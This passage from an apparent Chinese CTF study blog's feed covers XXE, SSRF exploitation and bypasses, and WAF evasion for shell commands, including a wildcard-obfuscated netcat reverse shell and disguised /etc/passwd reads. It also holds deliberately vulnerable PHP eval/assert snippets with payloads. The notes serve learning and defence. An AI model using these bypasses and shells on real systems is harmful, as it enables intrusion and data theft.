alt="img"></p><p>触发XXE攻击后，服务器会把文件内容发送到攻击者网站</p><p><img src="https://images2017.cnblogs.com/blog/1205477/201707/1205477-20170729145120957-1229784360.png" alt="img"></p><p>XXE危害2：执行系统命令</p><p><img src="https://images2017.cnblogs.com/blog/1205477/201707/1205477-20170729145129957-1907303428.png" alt="img"></p><p>该CASE是在安装expect扩展的PHP环境里执行系统命令，其他协议也有可能可以执行系统命令。</p><p>XXE危害3：探测内网端口</p><p><img src="https://images2017.cnblogs.com/blog/1205477/201707/1205477-20170729145153722-1549362415.png" alt="img"></p><p><img src="https://images2017.cnblogs.com/blog/1205477/201707/1205477-20170729145204847-766408731.png" alt="img"></p><p>该CASE是探测192.168.1.1的80、81端口，通过返回的“Connection refused”可以知道该81端口是closed的，而80端口是open的。</p><p>XXE危害4：攻击内网网站</p><p><img src="https://images2017.cnblogs.com/blog/1205477/201707/1205477-20170729145220472-216779729.png" alt="img"></p><p>该CASE是攻击内网struts2网站，远程执行系统命令。</p><p>(XXE的危害与攻击部分用的是下面这篇博客的材料，这里附上出处)<br>原文链接：<a href="https://blog.csdn.net/qq_40491569/article/details/83066200" target="_blank" rel="noopener">https://blog.csdn.net/qq_40491569/article/details/83066200</a></p><p>读取ip:file:///proc/net/arp</p>]]></content>
      
      
      
        <tags>
            
            <tag> XXE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ssrf</title>
      <link href="/2020/01/16/ssrf/"/>
      <url>/2020/01/16/ssrf/</url>
      
        <content type="html"><![CDATA[<h4 id="SSRF漏洞介绍："><a href="#SSRF漏洞介绍：" class="headerlink" title="SSRF漏洞介绍："></a>SSRF漏洞介绍：<a id="more"></a></h4><p>　　SSRF漏洞（服务器端请求伪造）：是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。（正是因为它是由服务端发起的，所以它能够请求到与它相连而与外网隔离的内部系统）。</p><h4 id="SSRF漏洞原理："><a href="#SSRF漏洞原理：" class="headerlink" title="SSRF漏洞原理："></a>SSRF漏洞原理：</h4><p>　　SSRF形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。比如从指定URL地址获取网页文本内容，加载指定地址的图片，下载等等。利用的是服务端的请求伪造。SSRF是利用存在缺陷的web应用作为代理攻击远程和本地的服务器。</p><h4 id="SSRF漏洞利用手段："><a href="#SSRF漏洞利用手段：" class="headerlink" title="SSRF漏洞利用手段："></a>SSRF漏洞利用手段：</h4><p>　　1.可以对外网、内网、本地进行端口扫描，某些情况下端口的Banner会回显出来（比如3306的）；</p><p>　　2.攻击运行在内网或本地的有漏洞程序（比如溢出）；</p><p>　　3.可以对内网Web应用进行指纹识别，原理是通过请求默认的文件得到特定的指纹；</p><p>　　4.攻击内网或外网有漏洞的Web应用；</p><p>　　5.使用file：///协议读取本地文件(或其他协议）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">　　http:&#x2F;&#x2F;www.xingkonglangzi.com&#x2F;ssrf.php?url&#x3D;192.168.1.10:3306</span><br><span class="line"></span><br><span class="line">　　http:&#x2F;&#x2F;www.xingkonglangzi.com&#x2F;ssrf.php?url&#x3D;file:&#x2F;&#x2F;&#x2F;c:&#x2F;windows&#x2F;win.ini</span><br></pre></td></tr></table></figure><h4 id="SSRF漏洞出现点："><a href="#SSRF漏洞出现点：" class="headerlink" title="***SSRF漏洞出现点："></a>***SSRF漏洞出现点：</h4><p>　　1.分享：通过URL地址分享网页内容　　　　　　　　　　　　　　　　　　　　　　　　　　</p><p>　　2.转码服务（通过URL地址把原地址的网页内容调优，使其适合手机屏幕的浏览）</p><p>　　3.在线翻译</p><p>　　4.图片加载与下载：通过URL地址加载或下载图片</p><p>　　5.图片、文章收藏功能</p><p>　　6.未公开的api实现及调用URL的功能</p><p>　　7.从URL关键字中寻找</p><h4 id="SSRF漏洞绕过方法："><a href="#SSRF漏洞绕过方法：" class="headerlink" title="***SSRF漏洞绕过方法："></a>***SSRF漏洞绕过方法：</h4><p>　　1.@　　　　　　　　　　<a href="http://abc.com@127.0.0.1" target="_blank" rel="noopener">http://abc.com@127.0.0.1</a></p><p>　　2.添加端口号　　　　　　<a href="http://127.0.0.1:8080" target="_blank" rel="noopener">http://127.0.0.1:8080</a></p><p>　　3.短地址　　　　　　　　<a href="https://0x9.me/cuGfD" target="_blank" rel="noopener">https://0x9.me/cuGfD</a></p><p>　　4.可以指向任意ip的域名　 xip.io</p><p>　　5.ip地址转换成进制来访问 192.168.0.1=3232235521（十进制）</p><p>　　6.非HTTP协议</p><p>　　7.DNS Rebinding</p><h3 id="SSRF漏洞的验证"><a href="#SSRF漏洞的验证" class="headerlink" title="***SSRF漏洞的验证"></a>***SSRF漏洞的验证</h3><p>我们先验证，请求是否是服务器端发出的，可以右键图片，使用新窗口打开图片，如果浏览器上地址栏是<a href="http://www.baidu.com/img/bd_logo1.png，说明不存在SSRF漏洞。" target="_blank" rel="noopener">http://www.baidu.com/img/bd_logo1.png，说明不存在SSRF漏洞。</a></p><p>可以用Firebug 或者burpsuite抓包工具，查看请求数据包中是否包含<a href="http://www.baidu.com/img/bd_logo1.png这个请求。由于SSRF是服务端发起的请求，因此在加载这张图片的时候本地浏览器中不应该存在图片的请求。" target="_blank" rel="noopener">http://www.baidu.com/img/bd_logo1.png这个请求。由于SSRF是服务端发起的请求，因此在加载这张图片的时候本地浏览器中不应该存在图片的请求。</a></p><p>在验证完是由服务端发起的请求之后，此处就有可能存在SSRF，接下来需要验证此URL是否可以来请求对应的内网地址。首先我们要获取内网存在HTTP服务且存在favicon.ico文件地址，才能验证是否是SSRF。</p><p>此处找内网地址可以通过从漏洞平台中的历史漏洞寻找泄露的内网地址过滤绕过</p><p>@：<br><a href="http://www.baidu.com@10.10.10.10与http?/10.10.10.10" target="_blank" rel="noopener">http://www.baidu.com@10.10.10.10与http?/10.10.10.10</a> 请求是相同的</p><p>过滤绕过<br>IP地址转换成十进制：<br>127.0.0.1=2130706433</p><h4 id="SSRF漏洞绕过方法：-1"><a href="#SSRF漏洞绕过方法：-1" class="headerlink" title="SSRF漏洞绕过方法："></a>SSRF漏洞绕过方法：</h4><p>　　</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1.基本判断（排除法）</span><br><span class="line"></span><br><span class="line">　　如：http:&#x2F;&#x2F;www.douban.com&#x2F;***&#x2F;service?image&#x3D;http:&#x2F;&#x2F;www.baidu.com&#x2F;img&#x2F;bd_logo1.png</span><br><span class="line"></span><br><span class="line">　　排除法一：直接右键图片，在新窗口打开图片，如果是浏览器上URL地址栏是http:&#x2F;&#x2F;www.baidu.com&#x2F;img&#x2F;bd_logo1.png，说明不存在SSRF漏洞。</span><br><span class="line"></span><br><span class="line">　　排除法二：使用burpsuite等抓包工具来判断是否不是SSRF，首先SSRF是由服务端发起的请求，因此在加载图片的时候，是由服务端发起的，所以在我们本地浏览器的请求中就不应该存在图片的请求，如果刷新当前页面，有如下请求，则可判断不是SSRF。（前提设置burpsuite截断图片的请求，默认是放行的）</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> ssrf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>逻辑绕过WAF</title>
      <link href="/2020/01/15/%E9%80%BB%E8%BE%91%E7%BB%95%E8%BF%87WAF/"/>
      <url>/2020/01/15/%E9%80%BB%E8%BE%91%E7%BB%95%E8%BF%87WAF/</url>
      
        <content type="html"><![CDATA[<h4 id="0X01-技巧一-通配符"><a href="#0X01-技巧一-通配符" class="headerlink" title="0X01 技巧一:通配符"></a>0X01 技巧一:通配符<a id="more"></a></h4><table><thead><tr><th>*****</th><th><strong>代表(0个到无穷多个)任意字符</strong></th></tr></thead><tbody><tr><td><strong>?</strong></td><td><strong>代表(一定有一个)任意字符</strong></td></tr><tr><td><strong>[ ]</strong></td><td><strong>同样代表（一定有一个在括号内）的字符，但是非任意字符。</strong></td></tr><tr><td><strong>[ - ]</strong></td><td><strong>代表在编码顺序内的所有字符，[0-9]代表0到9之间所有数字，因为数字的语系编码是连续的</strong></td></tr><tr><td><strong>[^ ]</strong></td><td><strong>表示反向选择，[‘^abc’]表示一定有一个字符，只要是非a，b，c字符就接受</strong></td></tr></tbody></table><p>例子：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">ls -l</span><br><span class="line">使用通配符</span><br><span class="line">&#x2F;?in&#x2F;?s -l</span><br><span class="line"></span><br><span class="line">读取&#x2F;etc&#x2F;passwd：</span><br><span class="line">&#x2F;???&#x2F;??t &#x2F;??c&#x2F;p???w?</span><br><span class="line">有时候WAF不允许使用太多的?号</span><br><span class="line">&#x2F;?in&#x2F;cat &#x2F;?tc&#x2F;p?sswd</span><br><span class="line"></span><br><span class="line">NC反弹shell：</span><br><span class="line">nc -e &#x2F;bin&#x2F;bash 127.0.0.1 3737</span><br><span class="line">为了避免符号.我们可以将IP地址转换成整型。</span><br><span class="line">127.0.0.1 → 2130706433</span><br><span class="line"></span><br><span class="line">使用通配符</span><br><span class="line"></span><br><span class="line">root@kali:~# &#x2F;??n&#x2F;?c -e &#x2F;??n&#x2F;b??h 2130706433 3737</span><br></pre></td></tr></table></figure><p>0X02 技巧二:连接符</p><p>用引号,反斜杠闭合，可以绕过一些匹配字符串的WAF规则.</p><p>读取/etc/passwd：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#39;b&#39;i&#39;n&#39;&#x2F;&#39;c&#39;a&#39;t&#39; &#x2F;&#39;e&#39;t&#39;c&#39;&#x2F;&#39;p&#39;a&#39;s&#39;s&#39;w&#39;d</span><br></pre></td></tr></table></figure><p>检测NC：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#39;b&#39;i&#39;n&#39;&#x2F;&#39;w&#39;h&#39;i&#39;c&#39;h&#39; &#39;n&#39;c</span><br></pre></td></tr></table></figure><p>没有NC的情况检查wget：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#39;b&#39;i&#39;n&#39;&#x2F;&#39;w&#39;h&#39;i&#39;c&#39;h&#39; &#39;w&#39;g&#39;e&#39;t</span><br></pre></td></tr></table></figure><p>其他字符：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">双引号</span><br><span class="line">&#x2F;&quot;b&quot;i&quot;n&quot;&#x2F;&quot;w&quot;h&quot;i&quot;c&quot;h&quot; &quot;n&quot;c</span><br></pre></td></tr></table></figure><p>反斜杆 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;b\i\n&#x2F;w\h\i\c\h n\c</span><br></pre></td></tr></table></figure><h2 id="0×03-技巧三：未初始化的bash变量"><a href="#0×03-技巧三：未初始化的bash变量" class="headerlink" title="0×03 技巧三：未初始化的bash变量"></a>0×03 技巧三：未初始化的bash变量</h2><p>在bash环境中允许我们使用未初始化的bash变量，如何</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$a,$b,$c</span><br></pre></td></tr></table></figure><p>我们事先并没有定义它们，输出看看：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# echo $a</span><br><span class="line"></span><br><span class="line">root@kali:~# echo $b</span><br><span class="line"></span><br><span class="line">root@kali:~# echo $c</span><br><span class="line"></span><br><span class="line">root@kali:~#</span><br></pre></td></tr></table></figure><p>未初始化的变量值都是null。</p><p>读取/etc/passwd：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat$a &#x2F;etc$a&#x2F;passwd$a</span><br></pre></td></tr></table></figure><h3 id="IFS是内部字段分隔符的缩写。它决定Bash解析字符串时将怎样识别字段，或单词分界线。默认为（空格、制表符、换号）"><a href="#IFS是内部字段分隔符的缩写。它决定Bash解析字符串时将怎样识别字段，或单词分界线。默认为（空格、制表符、换号）" class="headerlink" title="$IFS是内部字段分隔符的缩写。它决定Bash解析字符串时将怎样识别字段，或单词分界线。默认为（空格、制表符、换号）"></a><strong>$IFS是内部字段分隔符的缩写。它决定Bash解析字符串时将怎样识别字段，或单词分界线。默认为（空格、制表符、换号）</strong></h3>]]></content>
      
      
      
        <tags>
            
            <tag> 绕过技巧 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linux指令</title>
      <link href="/2020/01/15/linux%E6%8C%87%E4%BB%A4/"/>
      <url>/2020/01/15/linux%E6%8C%87%E4%BB%A4/</url>
      
        <content type="html"><![CDATA[<p>​    Kali常用的指令在比赛中还是会经常用到的</p><a id="more"></a>个人比较weak，做的整理就只能借鉴其他博主的：<h4 id="1-目录和文件命令"><a href="#1-目录和文件命令" class="headerlink" title="1.目录和文件命令"></a>1.目录和文件命令</h4><table><thead><tr><th align="center">命令</th><th align="center">作用</th></tr></thead><tbody><tr><td align="center"><strong>cd/home</strong></td><td align="center"><strong>进入/home目录</strong></td></tr><tr><td align="center"><strong>cd ../</strong></td><td align="center"><strong>返回上一级目录</strong></td></tr><tr><td align="center"><strong>cd ../../</strong></td><td align="center"><strong>返回上两级目录</strong></td></tr><tr><td align="center"><strong>cd</strong></td><td align="center"><strong>进入个人主目录</strong></td></tr><tr><td align="center"><strong>cd ~user1</strong></td><td align="center"><strong>进入个人的主目录</strong></td></tr><tr><td align="center"><strong>cd -</strong></td><td align="center"><strong>返回上次所在的目录</strong></td></tr><tr><td align="center"><strong>pwd</strong></td><td align="center"><strong>显示工作路径</strong></td></tr><tr><td align="center"><strong>ls</strong></td><td align="center"><strong>查看目录中的文件</strong></td></tr><tr><td align="center"><strong>ls -F</strong></td><td align="center"><strong>查看目录中的文件</strong></td></tr><tr><td align="center"><strong>ls -l</strong></td><td align="center"><strong>显示文件和目录的详细资料</strong></td></tr><tr><td align="center"><strong>ls -a</strong></td><td align="center"><strong>显示隐藏文件</strong></td></tr><tr><td align="center"><strong>ls [0-9]</strong></td><td align="center"><strong>显示包含数字的文件名和目录名</strong></td></tr><tr><td align="center"><strong>tree</strong></td><td align="center"><strong>显示文件和目录由根目录开始的树形结构</strong></td></tr><tr><td align="center"><strong>lstree</strong></td><td align="center"><strong>显示文件和目录有根目录开散的树形结构</strong></td></tr></tbody></table><h4 id="mkdir创建目录"><a href="#mkdir创建目录" class="headerlink" title="mkdir创建目录"></a>mkdir创建目录</h4><table><thead><tr><th><strong>mkdir -p /tmp/dir1/dir2</strong></th><th><strong>创建一个目录树</strong></th></tr></thead><tbody><tr><td><strong>rm -f</strong></td><td><strong>删除一个文件</strong></td></tr><tr><td><strong>rmdir</strong></td><td><strong>删除一个目录</strong></td></tr><tr><td><strong>rm -rf</strong></td><td><strong>删除一个目录并同时删除其文件</strong></td></tr><tr><td><strong>mv</strong></td><td><strong>重命名或者移动一个目录</strong></td></tr><tr><td><strong>cp file1 file2</strong></td><td><strong>复制一个文件</strong></td></tr><tr><td><strong>cp dir/*</strong></td><td><strong>复制一个目录到当前工作目录</strong></td></tr><tr><td><strong>cp -a/tmp/dir*</strong></td><td><strong>复制一个目录到当前工作目录</strong></td></tr><tr><td><strong>cp -a dir1 dir2</strong></td><td><strong>复制一个目录</strong></td></tr><tr><td><strong>cp -f</strong></td><td><strong>强行复制文件或目录</strong></td></tr></tbody></table><h4 id="touch创建一个文件"><a href="#touch创建一个文件" class="headerlink" title="touch创建一个文件"></a>touch创建一个文件</h4><table><thead><tr><th align="center"><strong>-a</strong></th><th align="center"><strong>只更改存储时间</strong></th></tr></thead><tbody><tr><td align="center"><strong>-c</strong></td><td align="center"><strong>不建立任何档案</strong></td></tr><tr><td align="center"><strong>-d</strong></td><td align="center"><strong>使用制定的日期，而非现在的时间</strong></td></tr><tr><td align="center"><strong>-f</strong></td><td align="center"></td></tr><tr><td align="center"><strong>-m</strong></td><td align="center"><strong>之更改变动时间</strong></td></tr><tr><td align="center"><strong>-r</strong></td><td align="center"><strong>把制定文档或目录的日期时间统设成和参考文档或目录日期时间相同</strong></td></tr><tr><td align="center"><strong>-t</strong></td><td align="center"><strong>使用指定日期时间，而非现在的时间</strong></td></tr></tbody></table><h4 id="cat查看目标文件的内容"><a href="#cat查看目标文件的内容" class="headerlink" title="cat查看目标文件的内容"></a>cat查看目标文件的内容</h4><table><thead><tr><th align="center"><strong>-b</strong></th><th align="center"><strong>对非空输出的所有行编号</strong></th></tr></thead><tbody><tr><td align="center"><strong>-n</strong></td><td align="center"><strong>对输出所有行编号</strong></td></tr><tr><td align="center"><strong>-s</strong></td><td align="center"><strong>不输出多行空行</strong></td></tr></tbody></table><h4 id="less查看文件"><a href="#less查看文件" class="headerlink" title="less查看文件"></a>less查看文件</h4><table><thead><tr><th align="center"><strong>N</strong></th><th align="center"><strong>反向重复前一个搜索</strong></th></tr></thead><tbody><tr><td align="center"><strong>-i</strong></td><td align="center"><strong>忽略搜索时的大小写</strong></td></tr><tr><td align="center"><strong>-N</strong></td><td align="center"><strong>显示行号</strong></td></tr><tr><td align="center"><strong>/</strong></td><td align="center"><strong>向下搜索字符串</strong></td></tr><tr><td align="center"><strong>？</strong></td><td align="center"><strong>向上搜索字符串</strong></td></tr><tr><td align="center"><strong>n</strong></td><td align="center"><strong>重复前一个搜素</strong></td></tr></tbody></table><h4 id="匹配查找命令"><a href="#匹配查找命令" class="headerlink" title="匹配查找命令"></a>匹配查找命令</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">grep</span><br><span class="line">grep命令是一种强大的文本搜索工具，他能使用正则表达式搜索文本，把匹配的行打印出来</span><br></pre></td></tr></table></figure><h4 id="find命令"><a href="#find命令" class="headerlink" title="find命令"></a>find命令</h4><p>find -name</p><h4 id="tar"><a href="#tar" class="headerlink" title="tar"></a>tar</h4><table><thead><tr><th align="center"><strong>-c</strong></th><th align="center"><strong>建立一个压缩文件的参数指令</strong></th></tr></thead><tbody><tr><td align="center"><strong>-x</strong></td><td align="center"><strong>解开一个压缩文件的参数指令</strong></td></tr><tr><td align="center"><strong>-t</strong></td><td align="center"><strong>查看tarfile里面的文件</strong></td></tr><tr><td align="center"><strong>-z</strong></td><td align="center"><strong>是否同时具有gzip的属性，是否需要gzip压缩</strong></td></tr><tr><td align="center"><strong>-j</strong></td><td align="center"><strong>是否同时具有bzip2的属性，是否需要bzip2压缩</strong></td></tr><tr><td align="center"><strong>-v</strong></td><td align="center"><strong>压缩的过程中显示文件</strong></td></tr><tr><td align="center"><strong>-f</strong></td><td align="center"><strong>使用档名</strong></td></tr><tr><td align="center"><strong>-c</strong></td><td align="center"><strong>解压到指定目录</strong></td></tr></tbody></table><h4 id="权限"><a href="#权限" class="headerlink" title="权限"></a>权限</h4><p>chmod 设置文件的访问权限<br>+:向权限范围增加权限代号所表示的权限<br>-:向权限范围取消权限代号所表示的权限<br>=:向权限范围赋予权限代号所表示的权限<br>用户符号：<br>u：拥有者<br>g：拥有者同组用<br>o：其它用户<br>a：所有用户</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">例子</span><br><span class="line">chmod u+w &#x2F;home&#x2F;abc.txt</span><br><span class="line">chmod o-x &#x2F;home&#x2F;abc.txt</span><br></pre></td></tr></table></figure><h4 id="清屏"><a href="#清屏" class="headerlink" title="清屏"></a>清屏</h4><p>reset</p><h1 id="补充-文档读取内容"><a href="#补充-文档读取内容" class="headerlink" title="补充:文档读取内容"></a>补充:文档读取内容</h1><p>cat\tac\nl\more\less\head\tail\od\fold\fmt\xxd</p><ul><li>cat 由第一行开始显示档案内容(concatenate)</li><li>tac 从最后一行开始显示，可以看出 tac 是 cat 的倒著写！</li><li>nl  显示的时候，顺道输出行号！</li><li>more 一页一页的显示档案内容</li><li><strong>less</strong> 与 more 类似，但是比 more 更好的是，他可以往前翻页！</li><li>head 只看头几行</li><li><strong>tail</strong> 只看尾巴几行</li><li>od  以二进位的方式读取档案内容！</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> linux常用命令 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>逻辑漏洞</title>
      <link href="/2020/01/15/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/"/>
      <url>/2020/01/15/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h3 id="1-原理"><a href="#1-原理" class="headerlink" title="1.原理"></a>1.原理<a id="more"></a></h3><p>命令执行漏洞是指应用有时需要调用一些执行系统命令的函数，如：<code>system()、exec()、shell_exec()、eval()、passthru()</code>，代码未对用户可控参数做过滤，当用户能控制这些函数中的参数时，就可以将恶意系统命令拼接到正常命令中，从而造成命令执行攻击。</p><h3 id="常见连接符"><a href="#常见连接符" class="headerlink" title="*常见连接符"></a>*常见连接符</h3><table><thead><tr><th>A;B</th><th>先执行A，再执行B</th></tr></thead><tbody><tr><td>A&amp;B</td><td>AB两个无制约关系，都可以执行</td></tr><tr><td>A|B</td><td>A不执行，B执行，只显示B的执行结果</td></tr><tr><td>A&amp;&amp;B</td><td>A执行成功才会执行B</td></tr><tr><td>A||B</td><td>A执行失败，然后才会执行B</td></tr></tbody></table><h3 id="2-分类"><a href="#2-分类" class="headerlink" title="2.分类"></a>2.分类</h3><h4 id="1‘-代码层过滤不严"><a href="#1‘-代码层过滤不严" class="headerlink" title="1‘.代码层过滤不严"></a>1‘.代码层过滤不严</h4><p>商业应用的一些核心代码封装在二进制文件中，在WEB应用中通过system函数来调用: <code>system(&quot;bin/program/--arg $arg&quot;);</code></p><h4 id="2’-系统的漏洞造成命令注入"><a href="#2’-系统的漏洞造成命令注入" class="headerlink" title="2’.系统的漏洞造成命令注入"></a>2’.系统的漏洞造成命令注入</h4><p>bash破壳漏洞(CVE-2013-6271)</p><h4 id="3’-调用的第三方组件存在代码执行漏洞"><a href="#3’-调用的第三方组件存在代码执行漏洞" class="headerlink" title="3’.调用的第三方组件存在代码执行漏洞"></a>3’.调用的第三方组件存在代码执行漏洞</h4><p>wordpress中用来处理图片的ImageMagick组件</p><p>JAVA中的命令执行漏洞（struts2/ElasticsearchGroovy等）</p><p>ThinkPHP命令执行漏洞</p><h3 id="3-防御"><a href="#3-防御" class="headerlink" title="3.防御"></a>3.防御</h3><p>1.尽量少用执行命令的函数或者直接禁用<br>2.参数值尽量使用引号包括，在拼接之前调用addslashes函数进行转义<br>3.在使用动态函数之前，确保使用的函数是指定的函数之一<br>4.在进入执行命令的函数方法之前，对参数进行过滤，对敏感字符进行转义<br>5.对于可控点是程序参数的情况下，使用escapeshellcmd函数进行过滤，对于可控点是程序参数值的情况下，使用escapeshellarg函数进行过滤</p><h4 id="下面是涉及到的知识点（个人认为）"><a href="#下面是涉及到的知识点（个人认为）" class="headerlink" title="下面是涉及到的知识点（个人认为）"></a>下面是涉及到的知识点（个人认为）</h4><h3 id="1-利用系统函数实现远程命令执行"><a href="#1-利用系统函数实现远程命令执行" class="headerlink" title="1.利用系统函数实现远程命令执行"></a>1.利用系统函数实现远程命令执行</h3><p>在PHP下，允许命令执行的函数有：</p><p><code>eval()</code></p><p><code>assert()</code></p><p><code>preg_replace()</code></p><p><code>call_user_func()</code></p><p><code>ob_start()、unserialize()、creat_function()</code><br><code>usort()、uasort()、uksort()</code><br><code>array_filter()</code><br><code>array_reduce()</code><br><code>array_map()</code><br><code>...</code></p><h4 id="eval-函数"><a href="#eval-函数" class="headerlink" title="eval()函数"></a>eval()函数</h4><p>定义和用法</p><p>eval()函数把字符串按照PHP代码来计算，该字符串必须合法且以分号结尾</p><p>若未在字符串中调用return语句，返回NULL,存在解析错误，返回false</p><p>语法<br>eval(phpcode)，phpcode 必需，规定要计算的 PHP 代码。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = $_GET[<span class="string">'a'</span>];</span><br><span class="line"><span class="keyword">eval</span>($a);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/oscommand/1.php?a=phpinfo();</span><br></pre></td></tr></table></figure><h4 id="assert-函数"><a href="#assert-函数" class="headerlink" title="assert()函数"></a>assert()函数</h4><p>定义和用法<br>检查一个断言是否为 FALSE</p><p>语法</p><p>PHP 5<br>bool assert ( mixed description ] )<br>PHP 7<br>bool assert ( mixed exception ] )<br>assert() 会检查指定的 assertion 并在结果为 FALSE 时采取适当的行动</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = $_GET[<span class="string">'a'</span>];</span><br><span class="line">assert($a);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/oscommand/1.php?a=phpinfo();</span><br><span class="line">http://127.0.0.1/oscommand/1.php?a=phpinfo()</span><br></pre></td></tr></table></figure><h4 id="preg-replace-函数"><a href="#preg-replace-函数" class="headerlink" title="preg_replace()函数"></a>preg_replace()函数</h4><p>定义<br>preg_replace 函数执行一个正则表达式的搜索和替换。</p><p>语法<br>mixed preg_replace ( mixed replacement , mixed limit = -1 [, int &amp;$count ]] )<br>搜索 subject 中匹配 pattern 的部分， 以 replacement 进行替换。<br>参数说明：</p><p>pattern处存在一个”/e”修饰符时，$replacement的值会被当成php代码来执行。<br>$replacement: 用于替换的字符串或字符串数组。<br>$subject: 要搜索替换的目标字符串或字符串数组。<br>$limit: 可选，对于每个模式用于每个 subject 字符串的最大可替换次数。 默认是-1（无限制）。<br>$count: 可选，为替换执行的次数。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = $_GET[<span class="string">'a'</span>];</span><br><span class="line"><span class="keyword">echo</span> preg_replace(<span class="string">"/test/e"</span>, $a, <span class="string">"just test!"</span>)</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;oscommand&#x2F;1.php?a&#x3D;phpinfo()</span><br></pre></td></tr></table></figure><h4 id="call-user-func-函数"><a href="#call-user-func-函数" class="headerlink" title="call_user_func()函数"></a>call_user_func()函数</h4><p>定义和用法<br>call_user_func — 把第一个参数作为回调函数调用</p><p>语法<br>mixed call_user_func ( callable parameter [, mixed $… ]] )<br>第一个参数 callback 是被调用的回调函数，其余参数是回调函数的参数。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">call_user_func($_GET[<span class="string">'a'</span>],$_GET[<span class="string">'b'</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;oscommand&#x2F;1.php?a&#x3D;assert&amp;b&#x3D;phpinfo()</span><br></pre></td></tr></table></figure><h3 id="2-系统命令执行漏洞"><a href="#2-系统命令执行漏洞" class="headerlink" title="2.系统命令执行漏洞"></a>2.系统命令执行漏洞</h3><p>系统命令执行的函数<br>system()<br>exec()<br>shell_exec()<br>passthru()<br>pcntl_exec()<br>popen()<br>proc_open()<br>反引号<br>…</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span 